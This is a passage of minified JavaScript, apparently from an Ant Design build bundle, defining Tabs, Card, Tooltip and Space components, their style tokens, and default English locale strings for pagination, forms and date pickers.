${r}`}}}}},[lF(e,"slide-up"),lF(e,"slide-down")]]})(t)]},e=>{let{cardHeight:t,cardHeightSM:r,cardHeightLG:n,controlHeight:o,controlHeightLG:a}=e,i=t||a,s=r||o,l=n||a+8;return{zIndexPopup:e.zIndexPopupBase+50,cardBg:e.colorFillAlter,cardHeight:i,cardHeightSM:s,cardHeightLG:l,cardPadding:`${(i-e.fontHeight)/2-e.lineWidth}px ${e.padding}px`,cardPaddingSM:`${(s-e.fontHeight)/2-e.lineWidth}px ${e.paddingXS}px`,cardPaddingLG:`${(l-e.fontHeightLG)/2-e.lineWidth}px ${e.padding}px`,titleFontSize:e.fontSize,titleFontSizeLG:e.fontSizeLG,titleFontSizeSM:e.fontSize,inkBarColor:e.colorPrimary,horizontalMargin:`0 0 ${e.margin}px 0`,horizontalItemGutter:32,horizontalItemMargin:"",horizontalItemMarginRTL:"",horizontalItemPadding:`${e.paddingSM}px 0`,horizontalItemPaddingSM:`${e.paddingXS}px 0`,horizontalItemPaddingLG:`${e.padding}px 0`,verticalItemPadding:`${e.paddingXS}px ${e.paddingLG}px`,verticalItemMargin:`${e.margin}px 0 0 0`,itemColor:e.colorText,itemSelectedColor:e.colorPrimary,itemHoverColor:e.colorPrimaryHover,itemActiveColor:e.colorPrimaryActive,cardGutter:e.marginXXS/2}}),lH=b.forwardRef((e,t)=>{var r,n;let o,{type:a,className:i,rootClassName:s,size:l,onEdit:c,hideAdd:u,centered:d,addIcon:p,removeIcon:m,moreIcon:f,more:g,popupClassName:h,children:y,items:v,animated:S,style:x,indicatorSize:C,indicator:w,classNames:k,styles:$,destroyInactiveTabPane:E,destroyOnHidden:P,tabPlacement:T,tabPosition:I,...M}=e,{prefixCls:R}=M,{getPrefixCls:A,direction:D,getPopupContainer:L,className:_,style:O,classNames:N,styles:F}=en("tabs"),{tabs:j}=b.useContext(ee),H=A("tabs",R),B=lk(H),[z,V]=lj(H,B),W=b.useRef(null);b.useImperativeHandle(t,()=>({nativeElement:W.current})),"editable-card"===a&&(o={onEdit:(e,{key:t,event:r})=>{c?.("add"===e?r:t,e)},removeIcon:m??j?.removeIcon??b.createElement(ab,null),addIcon:(p??j?.addIcon)||b.createElement(aw,null),showAdd:!0!==u});let U=A(),q=n6(l),G=(r=v,n=y,r?r.map(e=>({...e,destroyOnHidden:e.destroyOnHidden??e.destroyInactiveTabPane})):X(n).map(e=>{if(b.isValidElement(e)){let{key:t,props:r}=e,{tab:n,...o}=r||{};return{key:String(t),...o,label:n}}return null}).filter(e=>e)),J=function(e,t={inkBar:!0,tabPane:!1}){let r;return(r=!1===t?{inkBar:!1,tabPane:!1}:!0===t?{inkBar:!0,tabPane:!0}:{inkBar:!0,..."object"==typeof t?t:{}}).tabPane&&(r.tabPaneMotion={...lM,motionName:lI(e,"switch")}),r}(H,S),Q={align:w?.align??j?.indicator?.align,size:w?.size??C??j?.indicator?.size??j?.indicatorSize},Y=b.useMemo(()=>{let e=T??I??void 0,t="rtl"===D;switch(e){case"start":return t?"right":"left";case"end":return t?"left":"right";default:return e}},[T,I,D]),[Z,et]=n2([N,k],[F,$],{props:{...e,size:q,tabPlacement:Y,items:G}},{popup:{_default:"root"}});return b.createElement(lw,{ref:W,direction:D,getPopupContainer:L,...M,items:G,className:K({[`${H}-large`]:"large"===q,[`${H}-small`]:"small"===q,[`${H}-card`]:["card","editable-card"].includes(a),[`${H}-editable-card`]:"editable-card"===a,[`${H}-centered`]:d},_,i,s,Z.root,z,V,B),classNames:{...Z,popup:K(h,z,V,B,Z.popup?.root)},styles:et,style:{...et.root,...O,...x},editable:o,more:{icon:j?.more?.icon??j?.moreIcon??f??b.createElement(aS,null),transitionName:`${U}-slide-up`,...g},prefixCls:H,animated:J,indicator:Q,destroyOnHidden:P??E,tabPosition:Y})});lH.TabPane=()=>null;let lB=({prefixCls:e,className:t,hoverable:r=!0,...n})=>{let{getPrefixCls:o}=b.useContext(ee),a=o("card",e),i=K(`${a}-grid`,t,{[`${a}-grid-hoverable`]:r});return b.createElement("div",{...n,className:i})},lz=nA("Card",e=>{let t=r8(e,{cardShadow:e.boxShadowCard,cardHeadPadding:e.padding,cardPaddingBase:e.paddingLG,cardActionsIconSize:e.fontSize});return[(e=>{let{componentCls:t,cardShadow:r,cardHeadPadding:n,colorBorderSecondary:o,boxShadowTertiary:a,bodyPadding:i,extraColor:s,motionDurationMid:l}=e;return{[t]:{...na(e),position:"relative",background:e.colorBgContainer,borderRadius:e.borderRadiusLG,[`&:not(${t}-bordered)`]:{boxShadow:a},[`${t}-head`]:(e=>{let{antCls:t,componentCls:r,headerHeight:n,headerPadding:o,tabsMarginBottom:a}=e;return{display:"flex",justifyContent:"center",flexDirection:"column",minHeight:n,marginBottom:-1,padding:`0 ${tj(o)}`,color:e.colorTextHeading,fontWeight:e.fontWeightStrong,fontSize:e.headerFontSize,background:e.headerBg,borderBottom:`${tj(e.lineWidth)} ${e.lineType} ${e.colorBorderSecondary}`,borderRadius:`${tj(e.borderRadiusLG)} ${tj(e.borderRadiusLG)} 0 0`,...ns(),"&-wrapper":{width:"100%",display:"flex",alignItems:"center"},"&-title":{display:"inline-block",flex:1,...no,[`
          > ${r}-typography,
          > ${r}-typography-edit-content
        `]:{insetInlineStart:0,marginTop:0,marginBottom:0}},[`${t}-tabs-top`]:{clear:"both",marginBottom:a,color:e.colorText,fontWeight:"normal",fontSize:e.fontSize,"&-bar":{borderBottom:`${tj(e.lineWidth)} ${e.lineType} ${e.colorBorderSecondary}`}}}})(e),[`${t}-extra`]:{marginInlineStart:"auto",color:s,fontWeight:"normal",fontSize:e.fontSize},[`${t}-body`]:{padding:i,borderRadius:`0 0 ${tj(e.borderRadiusLG)} ${tj(e.borderRadiusLG)}`,"&:first-child":{borderStartStartRadius:e.borderRadiusLG,borderStartEndRadius:e.borderRadiusLG},"&:not(:last-child)":{borderEndStartRadius:0,borderEndEndRadius:0}},[`${t}-grid`]:(e=>{let{cardPaddingBase:t,colorBorderSecondary:r,cardShadow:n,lineWidth:o}=e;return{width:"33.33%",padding:t,border:0,borderRadius:0,boxShadow:`
      ${tj(o)} 0 0 0 ${r},
      0 ${tj(o)} 0 0 ${r},
      ${tj(o)} ${tj(o)} 0 0 ${r},
      ${tj(o)} 0 0 0 ${r} inset,
      0 ${tj(o)} 0 0 ${r} inset;
    `,transition:`all ${e.motionDurationMid}`,"&-hoverable:hover":{position:"relative",zIndex:1,boxShadow:n}}})(e),[`${t}-cover`]:{"> *":{display:"block",width:"100%",borderRadius:`${tj(e.borderRadiusLG)} ${tj(e.borderRadiusLG)} 0 0`}},[`${t}-actions`]:(e=>{let{componentCls:t,iconCls:r,actionsLiMargin:n,cardActionsIconSize:o,colorBorderSecondary:a,actionsBg:i}=e;return{margin:0,padding:0,listStyle:"none",background:i,borderTop:`${tj(e.lineWidth)} ${e.lineType} ${a}`,display:"flex",borderRadius:`0 0 ${tj(e.borderRadiusLG)} ${tj(e.borderRadiusLG)}`,...ns(),"& > li":{margin:n,color:e.colorTextDescription,textAlign:"center","> span":{position:"relative",display:"block",minWidth:e.calc(e.cardActionsIconSize).mul(2).equal(),fontSize:e.fontSize,lineHeight:e.lineHeight,cursor:"pointer","&:hover":{color:e.colorPrimary,transition:`color ${e.motionDurationMid}`},[`a:not(${t}-btn), > ${r}`]:{display:"inline-block",width:"100%",color:e.colorIcon,lineHeight:tj(e.fontHeight),transition:`color ${e.motionDurationMid}`,"&:hover":{color:e.colorPrimary}},[`> ${r}`]:{fontSize:o,lineHeight:tj(e.calc(o).mul(e.lineHeight).equal())}},"&:not(:last-child)":{borderInlineEnd:`${tj(e.lineWidth)} ${e.lineType} ${a}`}}}})(e),[`${t}-meta`]:{margin:`${tj(e.calc(e.marginXXS).mul(-1).equal())} 0`,display:"flex",...ns(),"&-avatar":{paddingInlineEnd:e.padding},"&-section":{overflow:"hidden",flex:1,"> div:not(:last-child)":{marginBottom:e.marginXS}},"&-title":{color:e.colorTextHeading,fontWeight:e.fontWeightStrong,fontSize:e.fontSizeLG,...no},"&-description":{color:e.colorTextDescription}}},[`${t}-bordered`]:{border:`${tj(e.lineWidth)} ${e.lineType} ${o}`,[`${t}-cover`]:{marginTop:-1,marginInlineStart:-1,marginInlineEnd:-1}},[`${t}-hoverable`]:{cursor:"pointer",transition:["box-shadow","border-color"].map(e=>`${e} ${l}`).join(", "),"&:hover":{borderColor:"transparent",boxShadow:r}},[`${t}-contain-grid`]:{borderRadius:`${tj(e.borderRadiusLG)} ${tj(e.borderRadiusLG)} 0 0 `,[`&:not(:has(> ${t}-head))`]:{borderRadius:0},[`${t}-body`]:{display:"flex",flexWrap:"wrap"},[`&:not(${t}-loading) ${t}-body`]:{marginBlockStart:e.calc(e.lineWidth).mul(-1).equal(),marginInlineStart:e.calc(e.lineWidth).mul(-1).equal(),padding:0}},[`${t}-contain-tabs`]:{[`> div${t}-head`]:{minHeight:0,[`${t}-head-title, ${t}-extra`]:{paddingTop:n}}},[`${t}-type-inner`]:(e=>{let{componentCls:t,colorFillAlter:r,headerPadding:n,bodyPadding:o}=e;return{[`${t}-head`]:{padding:`0 ${tj(n)}`,background:r,"&-title":{fontSize:e.fontSize}},[`${t}-body`]:{padding:`${tj(e.padding)} ${tj(o)}`}}})(e),[`${t}-loading`]:(e=>{let{componentCls:t}=e;return{overflow:"hidden",[`${t}-body`]:{userSelect:"none"}}})(e),[`${t}-rtl`]:{direction:"rtl"}}})(t),(e=>{let{componentCls:t,bodyPaddingSM:r,headerPaddingSM:n,headerHeightSM:o,headerFontSizeSM:a}=e;return{[`${t}-small`]:{[`> ${t}-head`]:{minHeight:o,padding:`0 ${tj(n)}`,fontSize:a,[`> ${t}-head-wrapper`]:{[`> ${t}-extra`]:{fontSize:e.fontSize}}},[`> ${t}-body`]:{padding:r}},[`${t}-small${t}-contain-tabs`]:{[`> ${t}-head`]:{[`${t}-head-title, ${t}-extra`]:{paddingTop:0,display:"flex",alignItems:"center"}}}}})(t)]},e=>({headerBg:"transparent",headerFontSize:e.fontSizeLG,headerFontSizeSM:e.fontSize,headerHeight:e.fontSizeLG*e.lineHeightLG+2*e.padding,headerHeightSM:e.fontSize*e.lineHeight+2*e.paddingXS,actionsBg:e.colorBgContainer,actionsLiMargin:`${e.paddingSM}px 0`,tabsMarginBottom:-e.padding-e.lineWidth,extraColor:e.colorText,bodyPaddingSM:12,headerPaddingSM:12,bodyPadding:e.bodyPadding??e.paddingLG,headerPadding:e.headerPadding??e.paddingLG})),lV=e=>{let{actionClasses:t,actions:r=[],actionStyle:n}=e;return b.createElement("ul",{className:t,style:n},r.map((e,t)=>{let n=`action-${t}`;return b.createElement("li",{style:{width:`${100/r.length}%`},key:n},b.createElement("span",null,e))}))},lW=b.forwardRef((e,t)=>{let r,{prefixCls:n,className:o,rootClassName:a,style:i,extra:s,headStyle:l={},bodyStyle:c={},title:u,loading:d,bordered:p,variant:m,size:f,type:g,cover:h,actions:y,tabList:v,children:S,activeTabKey:x,defaultActiveTabKey:C,tabBarExtraContent:w,hoverable:k,tabProps:$={},classNames:E,styles:P,...T}=e,{getPrefixCls:I,direction:M,className:R,style:A,classNames:D,styles:L}=en("card"),[_]=ae("card",m,p),O=n6(f),[N,F]=n2([D,E],[L,P],{props:{...e,size:O,variant:_,loading:d}}),j=b.useMemo(()=>X(S).some(e=>b.isValidElement(e)&&e.type===lB),[S]),H=I("card",n),[B,z]=lz(H),V=b.createElement(af,{loading:!0,active:!0,paragraph:{rows:4},title:!1},S),W=void 0!==x,U={...$,[W?"activeKey":"defaultActiveKey"]:W?x:C,tabBarExtraContent:w},q=v?b.createElement(lH,{size:"small"!==O?"large":O,...U,className:`${H}-head-tabs`,onChange:t=>{e.onTabChange?.(t)},items:v.map(({tab:e,...t})=>({label:e,...t}))}):null;if(u||s||q){let e=K(`${H}-head`,N.header),t=K(`${H}-head-title`,N.title),n=K(`${H}-extra`,N.extra),o={...l,...F.header};r=b.createElement("div",{className:e,style:o},b.createElement("div",{className:`${H}-head-wrapper`},u&&b.createElement("div",{className:t,style:F.title},u),s&&b.createElement("div",{className:n,style:F.extra},s)),q)}let G=K(`${H}-cover`,N.cover),Q=h?b.createElement("div",{className:G,style:F.cover},h):null,Y=K(`${H}-body`,N.body),Z={...c,...F.body},ee=b.createElement("div",{className:Y,style:Z},d?V:S),et=K(`${H}-actions`,N.actions),er=y?.length?b.createElement(lV,{actionClasses:et,actionStyle:F.actions,actions:y}):null,eo=J(T,["onTabChange"]),ea=K(H,R,{[`${H}-loading`]:d,[`${H}-bordered`]:"borderless"!==_,[`${H}-hoverable`]:k,[`${H}-contain-grid`]:j,[`${H}-contain-tabs`]:v?.length,[`${H}-small`]:"small"===O,[`${H}-type-${g}`]:!!g,[`${H}-rtl`]:"rtl"===M},o,a,B,z,N.root),ei={...F.root,...A,...i};return b.createElement("div",{ref:t,...eo,className:ea,style:ei},r,Q,ee,er)});lW.Grid=lB,lW.Meta=e=>{let{prefixCls:t,className:r,avatar:n,title:o,description:a,style:i,classNames:s,styles:l,...c}=e,{getPrefixCls:u,className:d,style:p,classNames:m,styles:f}=en("cardMeta"),g=u("card",t),h=`${g}-meta`,[y,v]=n2([m,s],[f,l],{props:e}),S=K(h,r,d,y.root),x={...p,...v.root,...i},C=K(`${h}-avatar`,y.avatar),w=K(`${h}-title`,y.title),k=K(`${h}-description`,y.description),$=K(`${h}-section`,y.section),E=n?b.createElement("div",{className:C,style:v.avatar},n):null,P=o?b.createElement("div",{className:w,style:v.title},o):null,T=a?b.createElement("div",{className:k,style:v.description},a):null,I=P||T?b.createElement("div",{className:$,style:v.section},P,T):null;return b.createElement("div",{...c,className:S,style:x},E,I)},e.s(["Card",0,lW],75712)},1361,e=>{"use strict";e.i(47167);var t=e.i(71645);let r={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M257.7 752c2 0 4-.2 6-.5L431.9 722c2-.4 3.9-1.3 5.3-2.8l423.9-423.9a9.96 9.96 0 000-14.1L694.9 114.9c-1.9-1.9-4.4-2.9-7.1-2.9s-5.2 1-7.1 2.9L256.8 538.8c-1.5 1.5-2.4 3.3-2.8 5.3l-29.5 168.2a33.5 33.5 0 009.4 29.8c6.6 6.4 14.9 9.9 23.8 9.9zm67.4-174.4L687.8 215l73.3 73.3-362.7 362.6-88.9 15.7 15.6-89zM880 836H144c-17.7 0-32 14.3-32 32v36c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-36c0-17.7-14.3-32-32-32z"}}]},name:"edit",theme:"outlined"};var n=e.i(9583);function o(){return(o=Object.assign.bind()).apply(this,arguments)}let a=t.forwardRef((e,a)=>t.createElement(n.default,o({},e,{ref:a,icon:r})));e.s(["default",0,a],1361)},76398,e=>{"use strict";e.s(["default",0,e=>null!=e])},14515,e=>{"use strict";var t=e.i(32044);let r=e=>{if((0,t.default)()&&window.document.documentElement){let t=Array.isArray(e)?e:[e],{documentElement:r}=window.document;return t.some(e=>e in r.style)}return!1};function n(e,t){if(!Array.isArray(e)&&void 0!==t){if(!r(e))return!1;let n=document.createElement("div"),o=n.style[e];return n.style[e]=t,n.style[e]!==o}return r(e)}e.s(["isStyleSupport",()=>n])},29447,95575,87414,e=>{"use strict";var t=e.i(71645);let r=(0,t.createContext)(void 0);function n(e){return(n="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e})(e)}function o(e,t){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter(function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable})),r.push.apply(r,n)}return r}function a(e){for(var t=1;t<arguments.length;t++){var r=null!=arguments[t]?arguments[t]:{};t%2?o(Object(r),!0).forEach(function(t){var o,a,i;o=e,a=t,i=r[t],(a=function(e){var t=function(e,t){if("object"!=n(e)||!e)return e;var r=e[Symbol.toPrimitive];if(void 0!==r){var o=r.call(e,t||"default");if("object"!=n(o))return o;throw TypeError("@@toPrimitive must return a primitive value.")}return("string"===t?String:Number)(e)}(e,"string");return"symbol"==n(t)?t:String(t)}(a))in o?Object.defineProperty(o,a,{value:i,enumerable:!0,configurable:!0,writable:!0}):o[a]=i}):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):o(Object(r)).forEach(function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))})}return e}e.s(["default",0,r],95575);var i=a(a({},{yearFormat:"YYYY",dayFormat:"D",cellMeridiemFormat:"A",monthBeforeYear:!0}),{},{locale:"en_US",today:"Today",now:"Now",backToToday:"Back to today",ok:"OK",clear:"Clear",week:"Week",month:"Month",year:"Year",timeSelect:"select time",dateSelect:"select date",weekSelect:"Choose a week",monthSelect:"Choose a month",yearSelect:"Choose a year",decadeSelect:"Choose a decade",previousMonth:"Previous month (PageUp)",nextMonth:"Next month (PageDown)",previousYear:"Last year (Control + left)",nextYear:"Next year (Control + right)",previousDecade:"Last decade",nextDecade:"Next decade",previousCentury:"Last century",nextCentury:"Next century"});let s={placeholder:"Select time",rangePlaceholder:["Start time","End time"]},l={lang:{placeholder:"Select date",yearPlaceholder:"Select year",quarterPlaceholder:"Select quarter",monthPlaceholder:"Select month",weekPlaceholder:"Select week",rangePlaceholder:["Start date","End date"],rangeYearPlaceholder:["Start year","End year"],rangeQuarterPlaceholder:["Start quarter","End quarter"],rangeMonthPlaceholder:["Start month","End month"],rangeWeekPlaceholder:["Start week","End week"],...i},timePickerLocale:{...s}},c="${label} is not a valid ${type}",u={locale:"en",Pagination:{items_per_page:"/ page",jump_to:"Go to",jump_to_confirm:"confirm",page:"Page",prev_page:"Previous Page",next_page:"Next Page",prev_5:"Previous 5 Pages",next_5:"Next 5 Pages",prev_3:"Previous 3 Pages",next_3:"Next 3 Pages",page_size:"Page Size"},DatePicker:l,TimePicker:s,Calendar:l,global:{placeholder:"Please select",close:"Close",sortable:"sortable"},Table:{filterTitle:"Filter menu",filterConfirm:"OK",filterReset:"Reset",filterEmptyText:"No filters",filterCheckAll:"Select all items",filterSearchPlaceholder:"Search in filters",emptyText:"No data",selectAll:"Select current page",selectInvert:"Invert current page",selectNone:"Clear all data",selectionAll:"Select all data",sortTitle:"Sort",expand:"Expand row",collapse:"Collapse row",triggerDesc:"Click to sort descending",triggerAsc:"Click to sort ascending",cancelSort:"Click to cancel sorting"},Tour:{Next:"Next",Previous:"Previous",Finish:"Finish"},Modal:{okText:"OK",cancelText:"Cancel",justOkText:"OK"},Popconfirm:{okText:"OK",cancelText:"Cancel"},Transfer:{titles:["",""],searchPlaceholder:"Search here",itemUnit:"item",itemsUnit:"items",remove:"Remove",selectCurrent:"Select current page",removeCurrent:"Remove current page",selectAll:"Select all data",deselectAll:"Deselect all data",removeAll:"Remove all data",selectInvert:"Invert current page"},Upload:{uploading:"Uploading...",removeFile:"Remove file",uploadError:"Upload error",previewFile:"Preview file",downloadFile:"Download file"},Empty:{description:"No data"},Icon:{icon:"icon"},Text:{edit:"Edit",copy:"Copy",copied:"Copied",expand:"Expand",collapse:"Collapse"},Form:{optional:"(optional)",defaultValidateMessages:{default:"Field validation error for ${label}",required:"Please enter ${label}",enum:"${label} must be one of [${enum}]",whitespace:"${label} cannot be a blank character",date:{format:"${label} date format is invalid",parse:"${label} cannot be converted to a date",invalid:"${label} is an invalid date"},types:{string:c,method:c,array:c,object:c,number:c,date:c,boolean:c,integer:c,float:c,regexp:c,email:c,url:c,hex:c},string:{len:"${label} must be ${len} characters",min:"${label} must be at least ${min} characters",max:"${label} must be up to ${max} characters",range:"${label} must be between ${min}-${max} characters"},number:{len:"${label} must be equal to ${len}",min:"${label} must be minimum ${min}",max:"${label} must be maximum ${max}",range:"${label} must be between ${min}-${max}"},array:{len:"Must be ${len} ${label}",min:"At least ${min} ${label}",max:"At most ${max} ${label}",range:"The amount of ${label} must be between ${min}-${max}"},pattern:{mismatch:"${label} does not match the pattern ${pattern}"}}},QRCode:{expired:"QR code expired",refresh:"Refresh",scanned:"Scanned"},ColorPicker:{presetEmpty:"Empty",transparent:"Transparent",singleColor:"Single",gradientColor:"Gradient"}};e.s(["default",0,u],87414),e.s(["default",0,(e,n)=>{let o=t.useContext(r);return[t.useMemo(()=>{let t=n||u[e],r=o?.[e]??{};return{..."function"==typeof t?t():t,...r||{}}},[e,n,o]),t.useMemo(()=>{let e=o?.locale;return o?.exist&&!e?u.locale:e},[o])]}],29447)},37908,95220,e=>{"use strict";var t=e.i(7670),r=e.i(71645);let n=e=>{let{children:n,prefixCls:o,id:a,classNames:i,styles:s,className:l,style:c}=e;return r.createElement("div",{id:a,className:(0,t.clsx)(`${o}-container`,i?.container,l),style:{...s?.container,...c},role:"tooltip"},"function"==typeof n?n():n)};e.s(["default",0,n],95220);var o=e.i(49637),a=e.i(87225);let i={shiftX:64,adjustY:1},s={adjustX:1,shiftY:!0},l=[0,0],c={left:{points:["cr","cl"],overflow:s,offset:[-4,0],targetOffset:l},right:{points:["cl","cr"],overflow:s,offset:[4,0],targetOffset:l},top:{points:["bc","tc"],overflow:i,offset:[0,-4],targetOffset:l},bottom:{points:["tc","bc"],overflow:i,offset:[0,4],targetOffset:l},topLeft:{points:["bl","tl"],overflow:i,offset:[0,-4],targetOffset:l},leftTop:{points:["tr","tl"],overflow:s,offset:[-4,0],targetOffset:l},topRight:{points:["br","tr"],overflow:i,offset:[0,-4],targetOffset:l},rightTop:{points:["tl","tr"],overflow:s,offset:[4,0],targetOffset:l},bottomRight:{points:["tr","br"],overflow:i,offset:[0,4],targetOffset:l},rightBottom:{points:["bl","br"],overflow:s,offset:[4,0],targetOffset:l},bottomLeft:{points:["tl","bl"],overflow:i,offset:[0,4],targetOffset:l},leftBottom:{points:["br","bl"],overflow:s,offset:[-4,0],targetOffset:l}};function u(){return(u=Object.assign.bind()).apply(this,arguments)}let d=r.forwardRef((e,i)=>{let{trigger:s=["hover"],mouseEnterDelay:l=0,mouseLeaveDelay:d=.1,prefixCls:p="rc-tooltip",children:m,onVisibleChange:f,afterVisibleChange:g,motion:h,placement:b="right",align:y={},destroyOnHidden:v=!1,defaultVisible:S,getTooltipContainer:x,arrowContent:C,overlay:w,id:k,showArrow:$=!0,classNames:E,styles:P,...T}=e,I=(0,a.default)(k),M=(0,r.useRef)(null);(0,r.useImperativeHandle)(i,()=>M.current);let R={...T};"visible"in e&&(R.popupVisible=e.visible);let A=r.useMemo(()=>{if(!$)return!1;let e=!0===$?{}:$;return{...e,className:(0,t.clsx)(e.className,E?.arrow),style:{...e.style,...P?.arrow},content:e.content??C}},[$,E?.arrow,P?.arrow,C]);return r.createElement(o.default,u({popupClassName:E?.root,prefixCls:p,popup:r.createElement(n,{key:"content",prefixCls:p,id:I,classNames:E,styles:P},w),action:s,builtinPlacements:c,popupPlacement:b,ref:M,popupAlign:y,getPopupContainer:x,onOpenChange:f,afterOpenChange:g,popupMotion:h,defaultPopupVisible:S,autoDestroy:v,mouseLeaveDelay:d,popupStyle:P?.root,mouseEnterDelay:l,arrow:A,uniqueContainerClassName:E?.uniqueContainer,uniqueContainerStyle:P?.uniqueContainer},R),({open:e})=>{let t=r.Children.only(m);return r.cloneElement(t,{"aria-describedby":w&&e?I:void 0})})});e.s(["default",0,d],37908)},48817,e=>{"use strict";var t=e.i(71645);let r=e=>"horizontal"===e||"vertical"===e;e.s(["useOrientation",0,(e,n,o)=>(0,t.useMemo)(()=>{let t;return[t=r(e)?e:"boolean"==typeof n?n?"vertical":"horizontal":r(o)?o:"horizontal","vertical"===t]},[o,e,n])])},87166,e=>{"use strict";e.i(47167);var t=e.i(71645);e.i(63335);var r=e.i(43081),n=e.i(7670),o=e.i(48817),a=e.i(42064),i=e.i(17455);let s=(0,e.i(46422).genStyleHooks)(["Space","Compact"],e=>{let{componentCls:t}=e;return{[t]:{display:"inline-flex","&-block":{display:"flex",width:"100%"},"&-vertical":{flexDirection:"column"},"&-rtl":{direction:"rtl"}}}},()=>({}),{resetStyle:!1}),l=t.createContext(null),c=e=>{let{children:r,...n}=e;return t.createElement(l.Provider,{value:t.useMemo(()=>n,[n])},r)};e.s(["NoCompactStyle",0,e=>{let{children:r}=e;return t.createElement(l.Provider,{value:null},r)},"default",0,e=>{let{getPrefixCls:u,direction:d}=t.useContext(a.ConfigContext),{size:p,direction:m,orientation:f,block:g,prefixCls:h,className:b,rootClassName:y,children:v,vertical:S,...x}=e,[C,w]=(0,o.useOrientation)(f,S,m),k=(0,i.default)(e=>p??e),$=u("space-compact",h),[E]=s($),P=(0,n.clsx)($,E,{[`${$}-rtl`]:"rtl"===d,[`${$}-block`]:g,[`${$}-vertical`]:w},b,y),T=t.useContext(l),I=(0,r.toArray)(v),M=t.useMemo(()=>I.map((e,r)=>{let n=e?.key||`${$}-item-${r}`;return t.createElement(c,{key:n,compactSize:k,compactDirection:C,isFirstItem:0===r&&(!T||T?.isFirstItem),isLastItem:r===I.length-1&&(!T||T?.isLastItem)},e)}),[I,T,C,k,$]);return 0===I.length?null:t.createElement("div",{className:P,...x},M)},"useCompactItemContext",0,(e,r)=>{let o=t.useContext(l),a=t.useMemo(()=>{if(!o)return"";let{compactDirection:t,isFirstItem:a,isLastItem:i}=o,s="vertical"===t?"-vertical-":"-";return(0,n.clsx)(`${e}-compact${s}item`,{[`${e}-compact${s}first-item`]:a,[`${e}-compact${s}last-item`]:i,[`${e}-compact${s}item-rtl`]:"rtl"===r})},[e,r,o]);return{compactSize:o?.compactSize,compactDirection:o?.compactDirection,compactItemClassnames:a}}],87166)},17206,e=>{"use strict";var t=e.i(71645),r=e.i(62139),n=e.i(87166),o=e.i(76398);e.s(["default",0,e=>{let{space:a,form:i,children:s}=e;if(!(0,o.default)(s))return null;let l=s;return i&&(l=t.default.createElement(r.NoFormStyle,{override:!0,status:!0},l)),a&&(l=t.default.createElement(n.NoCompactStyle,null,l)),l}])},22767,40010,7358,20560,5984,e=>{"use strict";e.i(47167);var t=e.i(71645),r=e.i(19581);let n=t.default.createContext(void 0);e.s(["default",0,n],40010);let o={Modal:100,Drawer:100,Popover:100,Popconfirm:100,Tooltip:100,Tour:100,FloatButton:100},a={SelectLike:50,Dropdown:50,DatePicker:50,Menu:50,ImagePreview:1};e.s(["useZIndex",0,(e,i)=>{let s,[,l]=(0,r.default)(),c=t.default.useContext(n),u=e in o;if(void 0!==i)s=[i,i];else{let t=c??0;u?t+=(c?0:l.zIndexPopupBase)+o[e]:t+=a[e],s=[void 0===c?i:t,t]}return s}],22767),e.i(96059);var i=e.i(15654),s=e.i(46422);function l(e){let{sizePopupArrow:t,borderRadiusXS:r,borderRadiusOuter:n}=e,o=t/2,a=n/Math.sqrt(2),i=o-n*(1-1/Math.sqrt(2)),s=o-1/Math.sqrt(2)*r,l=n*(Math.sqrt(2)-1)+1/Math.sqrt(2)*r,c=o*Math.sqrt(2)+n*(Math.sqrt(2)-2),u=n*(Math.sqrt(2)-1),d=`polygon(${u}px 100%, 50% ${u}px, ${2*o-u}px 100%, ${u}px 100%)`;return{arrowShadowWidth:c,arrowPath:`path('M 0 ${o} A ${n} ${n} 0 0 0 ${a} ${i} L ${s} ${l} A ${r} ${r} 0 0 1 ${2*o-s} ${l} L ${2*o-a} ${i} A ${n} ${n} 0 0 0 ${2*o-0} ${o} Z')`,arrowPolygon:d}}let c=(e,t,r)=>{let{sizePopupArrow:n,arrowPolygon:o,arrowPath:a,arrowShadowWidth:s,borderRadiusXS:l,calc:c}=e;return{pointerEvents:"none",width:n,height:n,overflow:"hidden","&::before":{position:"absolute",bottom:0,insetInlineStart:0,width:n,height:c(n).div(2).equal(),background:t,clipPath:{_multi_value_:!0,value:[o,a]},content:'""'},"&::after":{content:'""',position:"absolute",width:s,height:s,bottom:0,insetInline:0,margin:"auto",borderRadius:{_skip_check_:!0,value:`0 0 ${(0,i.unit)(l)} 0`},transform:"translateY(50%) rotate(-135deg)",boxShadow:r,zIndex:0,background:"transparent"}}};function u(e){let{contentRadius:t,limitVerticalRadius:r}=e,n=t>12?t+2:12;return{arrowOffsetHorizontal:n,arrowOffsetVertical:r?8:n}}e.s(["genRoundedArrow",0,c,"getArrowToken",()=>l],7358),e.s(["MAX_VERTICAL_CONTENT_RADIUS",0,8,"default",0,(e,t,r)=>{var n,o,a,l,u,d,p,m;let{componentCls:f,boxShadowPopoverArrow:g,arrowOffsetVertical:h,arrowOffsetHorizontal:b,antCls:y}=e,[v]=(0,s.genCssVar)(y,"tooltip"),{arrowDistance:S=0,arrowPlacement:x={left:!0,right:!0,top:!0,bottom:!0}}=r||{};return{[f]:{[`${f}-arrow`]:[{position:"absolute",zIndex:1,display:"block",...c(e,t,g),"&:before":{background:t}}],...(n=!!x.top,o={[`&-placement-top > ${f}-arrow,&-placement-topLeft > ${f}-arrow,&-placement-topRight > ${f}-arrow`]:{bottom:S,transform:"translateY(100%) rotate(180deg)"},[`&-placement-top > ${f}-arrow`]:{left:{_skip_check_:!0,value:"50%"},transform:"translateX(-50%) translateY(100%) rotate(180deg)"},"&-placement-topLeft":{[v("arrow-offset-x")]:b,[`> ${f}-arrow`]:{left:{_skip_check_:!0,value:b}}},"&-placement-topRight":{[v("arrow-offset-x")]:`calc(100% - ${(0,i.unit)(b)})`,[`> ${f}-arrow`]:{right:{_skip_check_:!0,value:b}}}},n?o:{}),...(a=!!x.bottom,l={[`&-placement-bottom > ${f}-arrow,&-placement-bottomLeft > ${f}-arrow,&-placement-bottomRight > ${f}-arrow`]:{top:S,transform:"translateY(-100%)"},[`&-placement-bottom > 